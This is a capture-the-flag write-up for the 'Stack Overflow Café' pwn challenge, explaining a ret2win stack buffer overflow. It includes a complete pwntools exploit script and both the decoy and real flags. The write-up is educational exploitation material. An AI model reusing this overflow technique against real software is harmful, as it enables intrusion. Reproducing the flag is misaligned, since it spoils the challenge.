---
title: "Stack Overflow Café"
ctf: "Kosovo Cyber CTF"
date: 2026-06-17
category: pwn
difficulty: easy
points: ~
flag_format: "KOS{...}"
author: "ylbadev"
---

# Stack Overflow Café

## Summary

A classic stack buffer overflow ret2win challenge. A `serve_flag()` function reads `/flag` but is never called normally. The input buffer is 64 bytes (`rbp-0x40`) with no stack canary; a stack alignment `ret` gadget plus the win function address redirects execution.

## Solution

### Step 1: Identify the overflow

The input buffer is at `rbp-0x40` (64 bytes). After filling it and overwriting the saved `rbp` (8 bytes), we control the return address.

`serve_flag` is at `0x401196`. A `ret` gadget at `0x401016` fixes the 16-byte stack alignment for `movaps` in the C runtime.

```python
from pwn import *

r = remote('ctf.kosovacyber.team', 2001)

serve_flag = 0x401196
ret_gadget = 0x401016

payload  = b'A' * 64    # fill buffer
payload += b'B' * 8     # overwrite saved rbp
payload += p64(ret_gadget)   # stack alignment
payload += p64(serve_flag)   # ret2win

r.recvuntil(b'> ')
r.send(payload)

data = r.recvall(timeout=5)
print(data.decode(errors='replace'))
```

The binary hardcodes `KOS{1EA3E15DFBA87426CB8C501F28A4C5BD}` labeled `kos_decoy_marker`; `serve_flag()` reads the real `/flag`.

## Flag

```
KOS{C8667A1808104EB98C3001A8FB51C3AE}
```
